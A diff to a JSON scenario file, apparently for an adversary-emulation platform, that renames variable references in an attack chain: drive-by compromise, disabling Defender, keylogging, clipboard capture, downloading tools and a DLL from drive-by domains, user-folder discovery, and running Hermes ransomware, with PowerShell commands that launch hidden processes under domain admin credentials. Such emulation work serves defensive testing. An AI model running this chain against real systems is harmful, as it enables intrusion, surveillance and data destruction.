@@ -13,7 +13,10 @@
             "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
-                "tool": "self.tool_name"
+                "tool": "state.tool_name"
+            },
+            "set_state": {
+                "actuator": "postconditions.actuator.ret.registered_id"
             }
         },
         {
@@ -21,9 +24,9 @@
             "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -31,9 +34,9 @@
             "technique": "DNS",
             "label": "DNS",
             "preconditions": {
-                "tool": "self.tool",
-                "exfil": "self.exfil",
-                "driveby": "self.driveby"
+                "tool": "state.tool",
+                "exfil": "state.exfil",
+                "driveby": "state.driveby"
             }
         },
         {
@@ -41,11 +44,11 @@
             "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
-                "self.tool_name": "self.tool",
-                "payload": "self.payload_name",
-                "exfiltration": "self.exfil",
-                "driveby": "self.driveby",
-                "driveby_ctl": "self.chimera"
+                "state.tool_name": "state.tool",
+                "payload": "state.payload_name",
+                "exfiltration": "state.exfil",
+                "driveby": "state.driveby",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -53,7 +56,7 @@
             "technique": "Interfaces",
             "label": "Interfaces2",
             "preconditions": {
-                "driveby": "self.driveby2"
+                "driveby": "state.driveby2"
             }
         },
         {
@@ -61,7 +64,7 @@
             "technique": "DNS",
             "label": "DNS2",
             "preconditions": {
-                "driveby": "self.driveby2"
+                "driveby": "state.driveby2"
             }
         },
         {
@@ -69,9 +72,9 @@
             "technique": "NGINX",
             "label": "NGINX2",
             "preconditions": {
-                "payload": "self.tool_name2",
-                "driveby": "self.driveby2",
-                "driveby_ctl": "self.chimera"
+                "payload": "state.tool_name2",
+                "driveby": "state.driveby2",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -79,7 +82,7 @@
             "technique": "Interfaces",
             "label": "Interfaces3",
             "preconditions": {
-                "driveby": "self.driveby3"
+                "driveby": "state.driveby3"
             }
         },
         {
@@ -87,7 +90,7 @@
             "technique": "DNS",
             "label": "DNS3",
             "preconditions": {
-                "driveby": "self.driveby3"
+                "driveby": "state.driveby3"
             }
         },
         {
@@ -95,9 +98,9 @@
             "technique": "NGINX",
             "label": "NGINX3",
             "preconditions": {
-                "payload": "self.tool_name3",
-                "driveby": "self.driveby3",
-                "driveby_ctl": "self.chimera"
+                "payload": "state.tool_name3",
+                "driveby": "state.driveby3",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -105,7 +108,7 @@
             "technique": "Interfaces",
             "label": "Interfaces4",
             "preconditions": {
-                "driveby": "self.driveby4"
+                "driveby": "state.driveby4"
             }
         },
         {
@@ -113,7 +116,7 @@
             "technique": "DNS",
             "label": "DNS4",
             "preconditions": {
-                "driveby": "self.driveby4"
+                "driveby": "state.driveby4"
             }
         },
         {
@@ -121,9 +124,9 @@
             "technique": "NGINX",
             "label": "NGINX4",
             "preconditions": {
-                "payload": "self.tool_name4",
-                "driveby": "self.driveby4",
-                "driveby_ctl": "self.chimera"
+                "payload": "state.tool_name4",
+                "driveby": "state.driveby4",
+                "driveby_ctl": "state.chimera"
             }
         },
         {
@@ -131,7 +134,7 @@
             "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
-                "tool": "self.tool"
+                "tool": "state.tool"
             }
         },
         {
@@ -139,10 +142,10 @@
             "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
-                "actuator": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -150,10 +153,10 @@
             "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             }
         },
         {
@@ -161,13 +164,16 @@
             "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
-                "actuator_id": "self.actuator",
-                "tool": "self.tool",
-                "driveby": "self.driveby",
-                "target": "self.target_1"
+                "actuator_id": "state.actuator",
+                "tool": "state.tool",
+                "driveby": "state.driveby",
+                "target": "state.target_1"
             },
             "tune": {
                 "infra": true
+            },
+            "set_state": {
+                "agent_tgt1": "postconditions.agent.ret.agent_id"
             }
         },
         {
@@ -175,9 +181,9 @@
             "technique": "DisableOrModifyTools",
             "label": "Disable_Defender_t1_1",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -185,9 +191,9 @@
             "technique": "ClipboardData",
             "label": "Get-clipboard-data_t1_2",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -195,9 +201,9 @@
             "technique": "Keylogging",
             "label": "Get-keyboard-data_t1_3",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "keylog_timer": 300000
@@ -208,13 +214,13 @@
             "technique": "IngressToolTransfer",
             "label": "Get-kit_t1_4",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "file_store_server": "self.driveby_domain2",
-                "file_name": "self.tool_name2",
+                "file_store_server": "state.driveby_domain2",
+                "file_name": "state.tool_name2",
                 "output_directory": "C:\\Users\\Public",
                 "output_file_name": "nkkit.zip"
             }
@@ -224,12 +230,12 @@
             "technique": "ProcessDiscovery",
             "label": "ProcessDiscovery_t1_5",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\Sysmon64.exe -i C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml;}'};echo 'Installed Sysmon';}"
+                "command": "powershell &{$password = ConvertTo-SecureString '${state.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${state.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\Sysmon64.exe -i C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml;}'};echo 'Installed Sysmon';}"
             }
         },
         {
@@ -237,12 +243,12 @@
             "technique": "FileDeletionPowershell",
             "label": "FileDeletion_t1_6",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\sdelete64.exe -p5 C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml}'}; echo 'Removed Sysmon config'}"
+                "command": "powershell &{$password = ConvertTo-SecureString '${state.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${state.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{C:\\Users\\Public\\nkkit\\sdelete64.exe -p5 C:\\Users\\Public\\nkkit\\sysmonconfig-export.xml}'}; echo 'Removed Sysmon config'}"
             }
         },
         {
@@ -250,9 +256,9 @@
             "technique": "NetworkShareDiscovery",
             "label": "Network-share_t1_7",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "net share"
@@ -263,9 +269,9 @@
             "technique": "NativeApi",
             "label": "Windows-native-api_t1_8",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -273,13 +279,13 @@
             "technique": "IngressToolTransfer",
             "label": "Get-dll-file_t1_9",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "file_store_server": "self.driveby_domain3",
-                "file_name": "self.tool_name3",
+                "file_store_server": "state.driveby_domain3",
+                "file_name": "state.tool_name3",
                 "output_directory": "C:\\Users\\Public",
                 "output_file_name": "popup.dll"
             }
@@ -289,9 +295,9 @@
             "technique": "Rundll32",
             "label": "Run-dll-file_t1_10",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "file_name": "C:\\Users\\Public\\popup.dll",
@@ -303,9 +309,9 @@
             "technique": "FileAndDirectoryDiscovery",
             "label": "fileAndDirectoryDiscovery_t1_11",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Desktop| Sort-Object -property lastwritetime; echo 'User Desktop Directory Listing Complete';}"
@@ -316,9 +322,9 @@
             "technique": "FileAndDirectoryDiscovery",
             "label": "fileAndDirectoryDiscovery_t1_12",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Downloads| Sort-Object -property lastwritetime; echo 'User Downloads Directory Listing Complete';}"
@@ -329,9 +335,9 @@
             "technique": "FileAndDirectoryDiscovery",
             "label": "fileAndDirectoryDiscovery_t1_13",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; Get-ChildItem C:\\Users\\$username\\Documents| Sort-Object -property lastwritetime; echo 'User Documents Directory Listing Complete';}"
@@ -342,13 +348,13 @@
             "technique": "IngressToolTransfer",
             "label": "Get-Ransomware-kit_t1_14",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
-                "file_store_server": "self.driveby_domain4",
-                "file_name": "self.tool_name4",
+                "file_store_server": "state.driveby_domain4",
+                "file_name": "state.tool_name4",
                 "output_directory": "C:\\Users\\Public",
                 "output_file_name": "TaskMon.zip"
             }
@@ -358,9 +364,9 @@
             "technique": "DeobfuscateDecodeFilesOrInformation",
             "label": "Uncompress-Hermes-Kit_t1_15",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{Expand-Archive C:\\Users\\Public\\TaskMon.zip -DestinationPath C:\\Users\\Public\\TaskMon; echo 'Unzip Complete'}"
@@ -371,9 +377,9 @@
             "technique": "FileDeletionPowershell",
             "label": "FileDeletion_t1_16",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             },
             "tune": {
                 "command": "powershell &{Remove-Item C:\\Users\\Public\\TaskMon.zip; echo 'Removed ZIP Tools'}"
@@ -384,9 +390,9 @@
             "technique": "DataEncryptedForImpact",
             "label": "Execute_Hermes_Ransomware_t1_17",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         },
         {
@@ -394,9 +400,9 @@
             "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
-                "agent": "self.agent_tgt1",
-                "tool": "self.tool",
-                "target": "self.target_1"
+                "agent": "state.agent_tgt1",
+                "tool": "state.tool",
+                "target": "state.target_1"
             }
         }
     ],
@@ -508,157 +514,25 @@
             }
         }
     },
-    "preconditions": {
-        "state": {},
-        "initial": {
-            "tool_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "name"
-                ]
-            },
-            "payload_name": {
-                "path": [
-                    "tool",
-                    "1",
-                    "ioc-binary_payload_name"
-                ]
-            },
-            "tool": {
-                "path": [
-                    "tool",
-                    "1"
-                ]
-            },
-            "tool_name2": {
-                "path": [
-                    "tool",
-                    "2",
-                    "name"
-                ]
-            },
-            "tool_name3": {
-                "path": [
-                    "tool",
-                    "3",
-                    "name"
-                ]
-            },
-            "tool_name4": {
-                "path": [
-                    "tool",
-                    "4",
-                    "name"
-                ]
-            },
-            "exfil": {
-                "path": [
-                    "exfil",
-                    "1"
-                ]
-            },
-            "driveby": {
-                "path": [
-                    "driveby",
-                    "1"
-                ]
-            },
-            "driveby_domain": {
-                "path": [
-                    "driveby",
-                    "1",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "driveby2": {
-                "path": [
-                    "driveby",
-                    "2"
-                ]
-            },
-            "driveby_domain2": {
-                "path": [
-                    "driveby",
-                    "2",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "driveby3": {
-                "path": [
-                    "driveby",
-                    "3"
-                ]
-            },
-            "driveby_domain3": {
-                "path": [
-                    "driveby",
-                    "3",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "driveby4": {
-                "path": [
-                    "driveby",
-                    "4"
-                ]
-            },
-            "driveby_domain4": {
-                "path": [
-                    "driveby",
-                    "4",
-                    "ioc-domain_driveby"
-                ]
-            },
-            "chimera": {
-                "path": [
-                    "chimera"
-                ]
-            },
-            "target_1": {
-                "path": [
-                    "targets",
-                    "1"
-                ]
-            },
-            "domain_admin_username": {
-                "path": [
-                    "targets",
-                    "1",
-                    "query-domain_admin_username"
-                ]
-            },
-            "domain_admin_password": {
-                "path": [
-                    "targets",
-                    "1",
-                    "query-domain_admin_password"
-                ]
-            }
-        },
-        "effects": {
-            "actuator": {
-                "path": [
-                    "actuator",
-                    "actuator",
-                    "ret",
-                    "registered_id"
-                ],
-                "default": 0
-            },
-            "scenario_infrastructure": {
-                "path": [
-                    "infrastructure"
-                ]
-            },
-            "agent_tgt1": {
-                "path": [
-                    "webProtocols_1",
-                    "agent",
-                    "ret",
-                    "agent_id"
-                ]
-            }
-        }
+    "state": {
+        "tool_name": "spec.tool.1.name",
+        "payload_name": "spec.tool.1.ioc-binary_payload_name",
+        "tool": "spec.tool.1",
+        "tool_name2": "spec.tool.2.name",
+        "tool_name3": "spec.tool.3.name",
+        "tool_name4": "spec.tool.4.name",
+        "exfil": "spec.exfil.1",
+        "driveby": "spec.driveby.1",
+        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
+        "driveby2": "spec.driveby.2",
+        "driveby_domain2": "spec.driveby.2.ioc-domain_driveby",
+        "driveby3": "spec.driveby.3",
+        "driveby_domain3": "spec.driveby.3.ioc-domain_driveby",
+        "driveby4": "spec.driveby.4",
+        "driveby_domain4": "spec.driveby.4.ioc-domain_driveby",
+        "chimera": "spec.chimera",
+        "target_1": "spec.targets.1",
+        "domain_admin_username": "spec.targets.1.query-domain_admin_username",
+        "domain_admin_password": "spec.targets.1.query-domain_admin_password"
     }
 }
